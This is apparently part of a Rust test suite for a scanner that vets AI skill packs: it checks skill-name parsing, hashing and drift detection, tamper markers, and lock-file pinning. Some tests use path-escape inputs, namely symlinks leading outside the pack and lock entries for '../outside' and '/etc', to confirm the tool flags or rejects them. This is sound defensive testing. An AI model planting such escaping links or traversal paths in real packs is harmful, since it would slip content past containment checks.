    fn the_name_walk_stops_at_its_entry_cap_and_deadline() {
        let d = tmp("cap").join("pack");
        fs::create_dir_all(&d).unwrap();
        for i in 0..50 {
            fs::create_dir_all(d.join(format!("d{i}"))).unwrap();
            fs::write(d.join(format!("f{i}")), "x").unwrap();
        }
        // Plain files cost nothing: 50 files fit a cap of 10 units, 50 dirs do not.
        let files_only = tmp("cap-files").join("pack");
        fs::create_dir_all(&files_only).unwrap();
        for i in 0..50 {
            fs::write(files_only.join(format!("f{i}")), "x").unwrap();
        }
        assert!(!skill_names_bounded(&files_only, None, 10).over_budget);
        let capped = skill_names_bounded(&d, None, 10);
        assert!(capped.over_budget && capped.unparseable, "{capped:?}");
        let late = skill_names_until(&d, Some(std::time::Instant::now()));
        assert!(late.over_budget, "{late:?}");
        assert!(!skill_names_until(&d, None).over_budget);
    }

    #[cfg(unix)]
    #[test]
    fn skill_md_and_skill_dirs_linking_outside_are_named_and_flagged() {
        let base = tmp("escape");
        let outside = base.join("outside");
        fs::create_dir_all(outside.join("tooldir")).unwrap();
        fs::write(outside.join("SKILL.md"), "---\nname: hidden\n---\n").unwrap();
        fs::write(
            outside.join("tooldir/SKILL.md"),
            "---\nname: hidden2\n---\n",
        )
        .unwrap();
        let pack = base.join("pack");
        fs::create_dir_all(pack.join("skills/x")).unwrap();
        std::os::unix::fs::symlink(outside.join("SKILL.md"), pack.join("skills/x/SKILL.md"))
            .unwrap();
        std::os::unix::fs::symlink(outside.join("tooldir"), pack.join("tool")).unwrap();
        std::os::unix::fs::symlink(base.join("missing"), pack.join("dangling")).unwrap();
        let n = skill_names_until(&pack, None);
        assert!(n.names.contains(&"x".to_string()), "{n:?}");
        assert!(n.unparseable, "{n:?}");
        assert_eq!(n.escaping, vec!["dangling", "tool", "x"]);
        assert!(!n.names.contains(&"hidden".to_string()));
    }

    #[test]
    fn tagged_and_bom_prefixed_names_are_read() {
        let d = tmp("tagged");
        let names = |body: &str| {
            fs::write(d.join("SKILL.md"), body).unwrap();
            frontmatter_names(&d.join("SKILL.md"))
        };
        let (n, parsed) = names("---\nname: !custom bar\n---\n");
        assert!(parsed && n.contains(&"bar".to_string()), "{n:?}");
        let (n, _) = names("---\nname: \"\u{feff}bar\"\n---\n");
        assert!(n.iter().all(|x| x == "bar"), "{n:?}");
    }

    #[test]
    fn rr5_pa_tag_and_bom_spellings_of_name_are_read() {
        let d = tmp("pa");
        for (body, want) in [
            ("---\nname: !custom bar\n---\n", "bar"),
            ("---\nname: !!str bar2\n---\n", "bar2"),
            ("---\nname: !custom \"bar3\"\n---\n", "bar3"),
            ("---\n\u{feff}name: bar4\n---\n", "bar4"),
            ("---\nname: \u{feff}bar5\n---\n", "bar5"),
            ("---\nname: \"\u{feff}bar6\"\n---\n", "bar6"),
            ("---\nname: ! bar7\n---\n", "bar7"),
            ("---\nname: !t\tbar8\n---\n", "bar8"),
        ] {
            fs::write(d.join("SKILL.md"), body).unwrap();
            let (names, _) = frontmatter_names(&d.join("SKILL.md"));
            assert!(names.contains(&want.to_string()), "{body:?}: {names:?}");
        }
    }

    #[test]
    fn a_deleted_state_file_is_tampering_once_one_was_written() {
        let d = DataDir {
            path: tmp("marker").join("data"),
            trusted: false,
        };
        assert!(!load(&d).tampered, "a fresh install");
        store(&d, &State::default()).unwrap();
        assert!(!load(&d).tampered);
        fs::remove_file(d.path.join(STATE_FILE)).unwrap();
        assert!(load(&d).tampered);
    }

    #[test]
    fn git_dir_changes_are_not_drift() {
        let d = tmp("git");
        fs::write(d.join("SKILL.md"), "# s").unwrap();
        fs::create_dir_all(d.join(".git")).unwrap();
        fs::write(d.join(".git/HEAD"), "1111").unwrap();
        let before = tree_hash(&d);
        fs::write(d.join(".git/FETCH_HEAD"), "abcd").unwrap();
        fs::write(d.join(".git/HEAD"), "2222").unwrap();
        assert_eq!(before, tree_hash(&d));
        fs::write(d.join("SKILL.md"), "# s2").unwrap();
        assert_ne!(before, tree_hash(&d));
    }

    #[test]
    fn hash_is_independent_of_location_and_sensitive_to_names() {
        let a = tmp("loc-a");
        let b = tmp("loc-b");
        for d in [&a, &b] {
            fs::create_dir_all(d.join("sub")).unwrap();
            fs::write(d.join("sub/x"), "x").unwrap();
        }
        assert_eq!(tree_hash(&a), tree_hash(&b));
        fs::rename(b.join("sub/x"), b.join("sub/y")).unwrap();
        assert_ne!(tree_hash(&a), tree_hash(&b));
        assert_eq!(tree_hash(&a.join("missing")), "");
    }

    #[test]
    fn decide_first_sight_by_grade() {
        assert_eq!(
            decide(None, &obs("h", Grade::Clean), None).state,
            PackStatus::Clean
        );
        assert_eq!(
            decide(None, &obs("h", Grade::Warn), None).state,
            PackStatus::Warned
        );
        let t = decide(None, &obs("h", Grade::High), None);
        assert_eq!((t.state, t.pin.as_str()), (PackStatus::Unreviewed, "h"));
        let t = decide(None, &obs("h", Grade::Block), None);
        assert_eq!(
            (t.state, t.reason),
            (PackStatus::Blocked, Some(Reason::Combo))
        );
    }

    #[test]
    fn decide_drift_blocks_and_keeps_the_pin() {
        let t = decide(Some("old"), &obs("new", Grade::Clean), None);
        assert_eq!(
            (t.state, t.reason, t.pin.as_str()),
            (PackStatus::Blocked, Some(Reason::Drift), "old")
        );
        let t = decide(Some("new"), &obs("new", Grade::Clean), None);
        assert_eq!(t.state, PackStatus::Clean);
    }

    #[test]
    fn decide_lock_mismatch_blocks_and_a_lock_match_counts_as_reviewed() {
        let mut o = obs("h", Grade::Clean);
        o.lock = Some("other".into());
        let t = decide(None, &o, None);
        assert_eq!(
            (t.state, t.reason),
            (PackStatus::Blocked, Some(Reason::LockMismatch))
        );
        let mut o = obs("h", Grade::High);
        o.lock = Some("h".into());
        o.lock_matches = true;
        assert_eq!(decide(None, &o, None).state, PackStatus::Warned);
        // A lock match never clears a combo.
        let mut o = obs("h", Grade::Block);
        o.lock = Some("h".into());
        o.lock_matches = true;
        assert_eq!(decide(None, &o, None).state, PackStatus::Blocked);
    }

    #[test]
    fn decide_trust_clears_and_repins() {
        let mut o = obs("new", Grade::Block);
        o.trusted = true;
        let t = decide(Some("old"), &o, None);
        assert_eq!((t.state, t.pin.as_str()), (PackStatus::Clean, "new"));
    }

    #[test]
    fn decide_floor_raises_but_never_lowers() {
        let t = decide(Some("h"), &obs("h", Grade::Clean), Some(PackStatus::Warned));
        assert_eq!(t.state, PackStatus::Warned);
        let t = decide(
            Some("h"),
            &obs("h", Grade::Clean),
            Some(PackStatus::Unreviewed),
        );
        assert_eq!(t.state, PackStatus::Unreviewed);
        let t = decide(Some("x"), &obs("h", Grade::Clean), Some(PackStatus::Warned));
        assert_eq!(t.state, PackStatus::Blocked);
    }

    #[test]
    fn skill_names_reads_dirs_and_frontmatter() {
        let d = tmp("names").join("pack");
        fs::create_dir_all(d.join("skills/inner")).unwrap();
        fs::write(d.join("SKILL.md"), "---\nname: \"top-name\"\n---\n# x").unwrap();
        fs::write(d.join("skills/inner/SKILL.md"), "# no frontmatter").unwrap();
        assert_eq!(skill_names(&d), vec!["inner", "pack", "top-name"]);
    }

    #[test]
    fn packs_lock_only_inside_the_project() {
        let p = tmp("lock");
        fs::create_dir_all(p.join(".claude/skills/a")).unwrap();
        fs::create_dir_all(p.join(".safe-ai-skill")).unwrap();
        fs::write(
            p.join(PACKS_LOCK),
            r#"{"packs":[{"path":".claude/skills/a","tree_hash":"h1"},
                {"path":"../outside","tree_hash":"h2"},{"path":"/etc","tree_hash":"h3"}]}"#,
        )
        .unwrap();
        let pins = packs_lock(&p);
        assert_eq!(pins.len(), 1);
        let key = key_of(&p.join(".claude/skills/a").canonicalize().unwrap());
        assert_eq!(pins.get(&key).map(String::as_str), Some("h1"));
    }

    #[test]
    fn same_name_packs_in_two_projects_do_not_collide() {
        let a = tmp("p1").join(".claude/skills/foo");
        let b = tmp("p2").join(".claude/skills/foo");
        fs::create_dir_all(&a).unwrap();
        fs::create_dir_all(&b).unwrap();
        let ka = key_of(&a.canonicalize().unwrap());
        let kb = key_of(&b.canonicalize().unwrap());
        assert_ne!(ka, kb);
        let mut s = State::default();
        for (k, h) in [(&ka, "ha"), (&kb, "hb")] {
            s.packs.insert(
                k.clone(),
                PackEntry {
                    kind: PackKind::Skill,
                    tree_hash: h.into(),
                    head: None,
                    first_seen: 0,
                    last_scanned_hash: h.into(),
                    grade: Grade::Clean,
                    state: PackStatus::Clean,
                    findings: vec![],
                    more_findings: 0,
                    flagged_rules: vec![],
                    reason: None,
                    names: vec!["foo".into()],
                    names_incomplete: false,
                    escaping: vec![],
                    approved: false,
                    quarantined_to: None,
                    note: None,
                },
            );
        }
        assert_eq!(s.packs.len(), 2);
        assert_eq!(s.packs[&ka].tree_hash, "ha");
        assert_eq!(s.packs[&kb].tree_hash, "hb");
    }
}
